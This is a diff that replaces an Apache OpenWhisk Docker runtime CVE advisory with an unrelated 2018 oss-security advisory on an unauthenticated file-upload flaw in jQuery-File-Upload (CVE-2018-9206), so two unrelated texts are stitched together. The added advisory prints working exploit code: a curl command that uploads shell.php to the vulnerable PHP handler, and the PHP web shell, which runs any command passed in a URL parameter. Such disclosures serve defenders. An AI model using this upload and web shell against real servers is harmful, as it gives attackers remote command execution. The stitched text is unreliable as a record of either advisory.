@@ -1,42 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/20/6
-Message-ID: <CAAC1_d7x6buq1aREekk_Eh9SjevQLPLkXc+aidiFBMcNz7GGwQ@mail.gmail.com>
-Date: Fri, 20 Jul 2018 18:07:08 +0000
-From: Rodric Rabbah <rabbah@...che.org>
-To: Apache Security Team <security@...che.org>, oss-security@...ts.openwall.com,  announce@...che.org, dev@...nwhisk.apache.org
-Cc: Ory Segal <ory@...esec.io>
-Subject: [CVE] CVE-2018-11757 Docker Skeleton Runtime for Apache OpenWhisk
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/11/2
+Message-id: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
+Date: Thu, 11 Oct 2018 16:06:21 +0000 (GMT)
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject:  jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Who is Affected: Apache OpenWhisk users with an explicitly created Docker
-action, and the Docker image used for the action inherits from the affected
-Docker tag:
-- openwhisk/dockerskeleton < 1.3.1
+Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+Author: Larry W. Cashdollar, @_larry0
+Date: 2018-10-09
+CVE-ID:[CVE-2018-9206]
+Download Site: https://github.com/blueimp/jQuery-File-Upload/
+Vendor: https://github.com/blueimp
+Vendor Notified: 2018-10-09
+Vendor Contact:
+Advisory: http://www.vapidlabs.com/advisory.php?v=204
+Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
+Vulnerability:
+The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.
 
-The Docker Skeleton Runtime does not currently have any Apache releases.
 
-Description: A Docker action running as a serverless function (e.g., wsk
-action create <name> —docker <image>), where the Dockerfile used to create
-the Docker image inherits one of the affected tags, may allow a carefully
-crafted parameter to overwrite the serverless function running inside the
-container. This requires the user included function to be vulnerable in
-some way, for example via parameter hijacking, remote code execution, or
-unsafe use of "eval()". Subsequent executions of the original function in
-the same container will use the replaced implementation if the function was
-successfully exploited.
+Exploit Code:
+$ curl -F "files=@...ll.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
 
-Mitigation: Users that create their own Docker runtimes to run as Apache
-OpenWhisk Docker actions, and who pin their Docker runtime image (e.g.,
-Dockerfile starts with "FROM openwhisk/dockerskeleton:1.0.0") should
-upgrade their Docker tag to the latest available tag. Users who build from
-source, should use the latest commit Git tag [1]. Operators of an Apache
-OpenWhisk deployment should check their runtime manifest to determine if
-they are affected, and if so, upgrade the tags in their runtimes manifest
-to automatically patch all actions runtimes when updating their deployment.
+Where shell.php is:
 
-Credit: This issue was researched and reported by Yuri Shapira and Ory
-Segal of PureSec.
-
-[1]
-https://github.com/apache/incubator-openwhisk-runtime-docker/commit/891896f25c39bc336ef6dda53f80f466ac4ca3c8
-
+<?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?>
+Screen Shots:
+Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514
+Content of type "text/html" skipped
